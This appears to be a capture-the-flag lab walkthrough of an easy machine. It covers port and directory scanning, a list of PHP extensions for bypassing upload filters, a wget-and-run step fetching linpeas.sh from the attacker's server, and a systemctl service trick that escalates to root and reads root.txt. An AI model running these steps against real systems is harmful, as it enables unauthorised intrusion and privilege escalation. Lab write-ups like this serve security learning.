

## Level: Easy


1. Scan with Rustscan

```bash 
rustscan -a 10.10.187.239 --range 1-65535 -- -A -T4 
```

2. Scan the web at port 3333 with gobuster:
```bash 
gobuster dir -u http://10.10.187.239:3333/ -w  /Users/phulelouch/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

3. Upload file, scan the extension list:

```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # Less known PHP extensions
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```

4. Upload file, scan the endpoint

```bash
gobuster dir -u http://10.10.187.239:3333/internal/ -w  /Users/phulelouch/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

5. have shell, read the user.txt
6. upload linpeas.sh

- At host:
```bash
python3 -m http.server 8888
```
- At machine:
```bash
cd /tmp; wget http://ip:8888/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
```

7. exploit the systemctl
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```
